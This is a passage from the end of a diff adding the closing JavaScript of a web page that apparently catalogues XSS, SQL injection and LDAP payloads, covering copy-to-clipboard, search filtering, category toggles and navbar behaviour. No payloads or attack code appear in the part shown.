+    });
+}
+
+async function handleCopy(e) {
+    const btn = e.currentTarget;
+    let rawPayload = btn.getAttribute('data-raw');
+    if (!rawPayload) rawPayload = btn.closest('.payload-item').querySelector('.payload-code').textContent;
+    try {
+        await navigator.clipboard.writeText(rawPayload);
+        const notification = document.getElementById('notification');
+        notification.style.display = 'block';
+        setTimeout(() => notification.style.display = 'none', 1800);
+        const originalText = btn.textContent;
+        btn.textContent = 'Copied!';
+        btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = originalText; btn.classList.remove('copied'); }, 1500);
+    } catch(err) { console.warn('Copy failed'); }
+}
+
+let currentFilter = 'all';
+let currentSearch = '';
+
+function applyFilter() {
+    const allItems = document.querySelectorAll('.category');
+    const payloadItems = document.querySelectorAll('.payload-item');
+    let visibleCount = 0;
+    const term = document.getElementById('searchInput').value.toLowerCase();
+    payloadItems.forEach(item => {
+        const name = item.querySelector('.payload-name')?.textContent.toLowerCase() || '';
+        const code = item.querySelector('.payload-code')?.textContent.toLowerCase() || '';
+        const desc = item.querySelector('.payload-desc')?.textContent.toLowerCase() || '';
+        const matches = term === '' || name.includes(term) || code.includes(term) || desc.includes(term);
+        item.style.display = matches ? '' : 'none';
+        if(matches) visibleCount++;
+    });
+    document.getElementById('visibleCount').textContent = visibleCount + ' payloads';
+    const xssCat = document.getElementById('xss-category');
+    const sqliCat = document.getElementById('sqli-category');
+    const ldapCat = document.getElementById('ldap-category');
+    if(currentFilter === 'xss') { xssCat.style.display = 'block'; sqliCat.style.display = 'none'; ldapCat.style.display = 'none'; }
+    else if(currentFilter === 'sqli') { xssCat.style.display = 'none'; sqliCat.style.display = 'block'; ldapCat.style.display = 'none'; }
+    else if(currentFilter === 'ldap') { xssCat.style.display = 'none'; sqliCat.style.display = 'none'; ldapCat.style.display = 'block'; }
+    else { xssCat.style.display = 'block'; sqliCat.style.display = 'block'; ldapCat.style.display = 'block'; }
+}
+
+window.addEventListener('scroll', () => document.getElementById('navbar').classList.toggle('scrolled', window.scrollY > 20));
+const menuBtn = document.getElementById('menuBtn');
+const navLinksEl = document.getElementById('navLinks');
+menuBtn.addEventListener('click', () => navLinksEl.classList.toggle('open'));
+document.getElementById('searchInput').addEventListener('input', applyFilter);
+document.querySelectorAll('.category-item').forEach(item => {
+    item.addEventListener('click', function() { currentFilter = this.getAttribute('data-filter'); applyFilter(); });
+});
+renderXSS();
+attachCopyEvents();
+setTimeout(() => { document.querySelectorAll('.copy-btn').forEach(btn => btn.removeEventListener('click', handleCopy) || btn.addEventListener('click', handleCopy)); }, 100);
+const video = document.getElementById('bgVideo'); if(video) video.play().catch(() => {});
+</script>
+</body>
+</html>
